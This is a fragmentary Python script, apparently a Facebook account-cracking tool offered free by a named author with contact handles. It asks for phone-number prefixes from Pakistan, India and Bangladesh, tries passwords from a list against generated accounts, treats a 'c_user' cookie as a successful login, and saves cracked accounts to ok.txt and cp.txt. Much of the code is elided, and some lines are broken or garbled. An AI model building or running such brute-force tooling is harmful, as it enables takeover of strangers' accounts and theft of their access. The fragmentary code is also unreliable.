...
def ud():
    ...
    if opt == '1':
        ...
        FD()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;96m')


def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;32m [1] VITORE JW')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;37m Choose option >>> ')
    if opt == '1':
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[ðŸŽ®] %s \x1b[1;92m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
...
\033[1;37m════════════════════════════════════════════════════════════════
\033[1;37m════════════════════════════════════════════════════════════════
\033[1;37m╔══[•] Author»»»»»»»»»»»»»╔══[•] ⚔️\033[1;32m TONMOY MAHATO 🙋
\033[1;37m╠══───────────────────────╠══
\033[1;37m╠══[•] WhatsApp»»»»»»»»»»»╠══[•] ⚔️\033[1;32m +88017*********😑
\033[1;37m╠══───────────────────────╠══
\033[1;37m╠══[•] Facebook»»»»»»»»»»»╠══[•] ⚔️\033[1;32m TONMOY🥲
\033[1;37m╠══───────────────────────╠══
\033[1;37m╠══[•] YouTube»»»»»»»»»»»»╠══[•] ⚔️\033[1;32m TONMOY MAHATO📽️
\033[1;37m╠══───────────────────────╠══
\033[1;37m╚══[•] Github»»»»»»»»»»»»»╚══[•] ⚔️\033[1;32m tonmoy404-cyber🖥️
\033[1;37m════════════════════════════════════════════════════════════════
🥀🥀🥀\033[1;37mcp id 7 day \033[1;32mafter login 🥀🥀🥀
🥰🥰🥰\033[1;37mok id \033[1;32mjust login 💥🔥🥰
💥🔥🥀\033[1;37mFree Tool\033[1;32m Enjoy 🥀🔥💥
\033[1;37m════════════════════════════════════════════════════════════════\033[1;32m""")
loop = 0
oks = []
cps = []
...
def i():
    ...
    jalan('\033[1;31m     \t     PAK CODES\n     \033[1;31m92301, \033[1;31m92302 ,\033[1;31m92303 ,\033[1;31m92305  ...\033[0;97m')
    jalan('\033[1;37m═══════════════════════════════════════════')
    jalan('\033[1;30m     \t     INDIA CODES\n     \033[1;30m91778, \033[1;30m91930 ,\033[1;30m91902 ,\033[1;30m91712  ...\033[0;97m')
    jalan('\033[1;37m═══════════════════════════════════════════')
    jalan('\033[1;32m     \t     BD CODES\n     \033[1;32m88016, \033[1;32m88017 ,\033[1;32m88018 ,\033[1;32m88019  ...\033[0;97m')
    jalan('\033[1;37m═══════════════════════════════════════════\n')
    code = input(' PUT CODE : ')
    print("")
    ...
    print('\033[1;37m═══════════════════════════════════════════')
    print('\033[1;32mCrack process has been completed')
    print('\033[1;32mIds saved in ok.txt,cp.txt')
    print('\033[1;37m═══════════════════════════════════════════')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[TONMOY] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
